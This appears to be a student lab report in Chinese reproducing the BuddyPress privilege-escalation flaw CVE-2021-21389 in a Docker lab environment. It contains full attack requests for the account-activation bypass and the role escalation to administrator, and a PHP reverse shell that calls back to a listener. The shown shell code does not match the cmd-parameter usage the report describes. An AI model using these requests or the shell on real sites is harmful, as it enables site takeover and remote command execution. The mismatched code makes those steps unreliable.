# 实验报告：WordPress 垂直越权（CVE-2021-21389）漏洞复现

## 一、实验目的
本文旨在详细复现 WordPress 垂直越权漏洞（CVE-2021-21389），通过实验过程深入理解该漏洞的成因、利用方法及其潜在风险，为后续的安全防护提供参考。

## 二、实验环境
1. **操作系统**：Kali Linux
2. **WordPress**：版本 5.0.4（受影响版本）
3. **BuddyPress 插件**：版本 7.2.0（受影响版本）
4. **测试工具**：Burp Suite 等抓包工具

## 三、漏洞简介
BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2.1 之前的 5.0.4 版本的 BuddyPress 中，非特权普通用户可以通过利用 REST API 成员端点中的问题来获得管理员权限。该漏洞已在 BuddyPress 7.2.1 中修复。插件的现有安装应更新到此版本以缓解问题。

## 四、实验步骤

### （一）环境搭建
1. **拉取所需镜像**
docker pull vulfocus/wordpress_cve-2021-21389:latest
docker pull vulfocus/thinkphp-cve_2018_1002015:latest
docker pull vulfocus/samba-cve_2017_7494:latest 
docker pull c4pr1c3/vulshare_nginx-php-flag:latest
docker pull vulfocus/apache-cve_2021_41773
docker pull vulfocus/weblogic-cve_2020_2555

![1747473863077](image/homework/1747473863077.png)
![1747473881917](image/homework/1747473881917.png)
![1747473893030](image/homework/1747473893030.png)
![1747473905026](image/homework/1747473905026.png)
![1747648013574](image/homework/1747648013574.png)

2. 启动vulfucus环境
![1747896129453](image/readme/1747896129453.png)
![1747896152092](image/readme/1747896152092.png)

3. 场景搭建&启动场景

4. 打开浏览器，访问场景地址
![1747897882478](image/readme/1747897882478.png)

### （二）注册绕过
1. **抓包注册请求**
   - 使用 Burp Suite 或 Yakit 抓包。
   ![1747897930858](image/readme/1747897930858.png)
   - 点击`send to repeater`，构造 POST 请求，发送到 `/wp-json/buddypress/v1/signup`。
   - 请求体如下：
     ```json
     {
       "user_login": "attacker1",
       "user_email": "attacker1@163.com",
       "user_name": "attacker1",
       "password": "attacker1"
     }
     ```
    - 最终构造的请求包：
        ```
        POST /wp-json/buddypress/v1/signup HTTP/1.1

        Host: 192.168.20.12:10459

        Upgrade-Insecure-Requests: 1

        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0

        Accept: */*

        Accept-Encoding: gzip, deflate

        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

        Content-Type: application/json; charset=UTF-8

        Content-Length: 112



        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```

    - 替换 `Host` 为自己的 IP 和端口。
    - 得到回显:
        ```
            HTTP/1.1 200 OK

            Date: Thu, 22 May 2025 03:48:36 GMT

            Server: Apache/2.4.18 (Ubuntu)

            X-Robots-Tag: noindex

            Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"

            X-Content-Type-Options: nosniff

            Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link

            Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type

            Allow: POST

            Content-Length: 280

            Content-Type: application/json; charset=UTF-8



            [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
            ```
2. **提取激活密钥**
   - 发送请求后，服务器会返回一个响应包，其中包含 `activation_key`。
   ![1747885758997](image/homework/1747885758997.png)
   `activation_key` : `aoM0svmO72kVVPbNxYadAKifjIUuYqj8`
   - 提取 `activation_key`，用于后续的激活操作。

3. **构造激活请求**
   - 使用提取的 `activation_key` 构造 PUT 请求，发送到 `/wp-json/buddypress/v1/signup/activate/<activation_key>`。
   ![1747885790638](image/homework/1747885790638.png)
   - 请求体与注册请求相同。
   - 完整请求包：
        ```
        PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1

        Host:192.168.20.12:10459

        Upgrade-Insecure-Requests: 1

        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0

        Accept: */*

        Accept-Encoding: gzip, deflate

        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

        Content-Type: application/json; charset=UTF-8

        Content-Length: 112



        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```
    - **得到回显:**
        ```
        HTTP/1.1 200 OK

        Date: Thu, 22 May 2025 03:49:29 GMT

        Server: Apache/2.4.18 (Ubuntu)

        X-Robots-Tag: noindex

        Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"

        X-Content-Type-Options: nosniff

        Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link

        Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type

        Content-Length: 280

        Content-Type: application/json; charset=UTF-8



        [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
        ```

4. **登录验证**
   - 使用注册的账号 `attacker1` 和密码 `attacker1` 登录。
   ![1747885902130](image/homework/1747885902130.png)
   - 登录后，用户将获得普通用户权限，但尚未获得管理员权限。
   ![1747885938881](image/homework/1747885938881.png)

### （三）获取管理员权限
1. **创建用户组**
   - 访问 `http://<your_ip>:<your_port>/groups/create/step/group-details/`。
   - 填写组信息并完成创建。
   - 通过创建用户组，用户将被添加到该组中，为后续的权限提升做准备。
    ![1747888798026](image/homework/1747888798026.png)
    ![1747888866380](image/homework/1747888866380.png)
    ![1747888878196](image/homework/1747888878196.png)
    ![1747888898177](image/homework/1747888898177.png)
    ![1747888916532](image/homework/1747888916532.png)
    ![1747888936571](image/homework/1747888936571.png)
2. **抓取关键参数**
   - 点击 `manage`，再点击 `members`，使用抓包工具抓取请求。
   - 提取请求中的 `X-WP-Nonce` 和 `Cookie` 参数。
   ![1747889012605](image/homework/1747889012605.png)
    **cookie:**
        ```
        grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821
        ```
        **X-WP-Nonce:** ``cb16f80772``

3. **构造提权请求**
   - 使用提取的 `X-WP-Nonce` 和 `Cookie` 构造 POST 请求，发送到 `/wp-json/buddypress/v1/members/me`。
   - 请求体如下：
     ```json
     {"roles": "administrator"}
     ```
   - 完整请求包：
        ```http
        POST /wp-json/buddypress/v1/members/me HTTP/1.1

        Host:192.168.20.12:10459

        Upgrade-Insecure-Requests: 1

        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0

        Accept: */*

        Accept-Encoding: gzip, deflate

        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

        X-WP-Nonce: cb16f80772

        Cookie: grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821SS

        Content-Type: application/json; charset=UTF-8

        Content-Length: 28

        {"roles": "administrator"}
        ```
     ![1747890470194](image/homework/1747890470194.png)
     ![1747890494107](image/homework/1747890494107.png)

4. **验证提权结果**
   - 发送请求后，用户角色将被提升为管理员。
   - 再次登录 WordPress 后台，验证是否获得管理员权限，发现 dashboard 页面功能增加。
   ![1747890528150](image/homework/1747890528150.png)

### （四）上传木马，获取 Shell
1. **上传木马文件**
   - 在 WordPress 后台，点击 `Plugins` 模块，选择 `Add New`。
   ![1747890547884](image/homework/1747890547884.png)
   ![1747890578223](image/homework/1747890578223.png)
   - 点击 `Upload Plugin`，上传包含一句话木马的 PHP 文件。
   ![1747890605964](image/homework/1747890605964.png)
   - 木马文件内容如下：
        ```php
        <?php
        $sock = fsockopen("192.168.168.10", 4444);
        $proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        ?>
        ```
        ![1747890820999](image/homework/1747890820999.png)
2. **验证木马执行**
   - 上传成功后，访问 `/wp-content/uploads/<year>/<month>/c.php`。
    ![1747890861599](image/homework/1747890861599.png)
    ![1747890872341](image/homework/1747890872341.png)
   **第一种方法 :**
      - 通过 URL 参数 `cmd` 执行系统命令，例如：
         ```
         http://<your_ip>:<your_port>/wp-content/uploads/2025/05/c.php?cmd=id
         ```
      - 如果返回用户 ID 信息，则说明木马执行成功，获得了 Shell。
      ![1747891827132](image/homework/1747891827132.png)
      ![1747891841145](image/homework/1747891841145.png)
      - 由此,我们找到/tmp目录下的flag,将其输入到场景flag中,成功得分
      flag为`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`
      ![1747891890594](image/homework/1747891890594.png)
   **第二种方法 :**
      - 我们也可以用 metasploit 获取反弹 shell**
      ![1747893446502](image/homework/1747893446502.png)
      ![1747893462723](image/homework/1747893462723.png)


## 五、漏洞原理分析
1. **注册绕过**
   - BuddyPress 的注册机制存在缺陷，允许攻击者通过直接激活账户绕过邮箱验证。
   - 该机制未对激活请求进行严格的身份验证，导致攻击者可以利用 `activation_key` 直接激活账户。
2. **权限提升**
   - BuddyPress 的 REST API 成员端点 `/wp-json/buddypress/v1/members/me` 未对敏感字段（如 `roles`）进行权限校验。
   - 攻击者可以通过修改 `roles` 字段，将普通用户提升为管理员。
3. **木马上传**
   - WordPress 的插件上传功能未对上传文件的类型进行严格限制，允许上传 PHP 文件。
   - 攻击者可以利用此漏洞上传包含恶意代码的 PHP 文件，从而在服务器上执行任意命令。

## 六、实验总结
本次实验成功复现了 WordPress 垂直越权漏洞（CVE-2021-21389），并详细分析了漏洞的成因、利用方法及其潜在风险。实验结果表明，该漏洞允许攻击者通过简单的步骤获取管理员权限，并进一步上传木马文件获取 Shell。因此，及时更新插件和加强安全配置是防止此类漏洞的关键措施。

## 七、修复思路
1. **更新插件**
   - 将 BuddyPress 插件更新到最新版本（7.2.1 及以上），以修复该漏洞。
2. **强化安全配置**
   - 配置 WordPress 的安全设置，限制插件上传的文件类型，禁止上传 PHP 文件。
   - 使用安全插件对上传文件进行扫描和检测，防止恶意文件上传。
3. **定期安全审计**
   - 定期对 WordPress 站点进行安全审计，检查是否存在潜在的安全漏洞。
   - 及时更新 WordPress 核心、插件和主题，以防止被已知漏洞攻击。

---
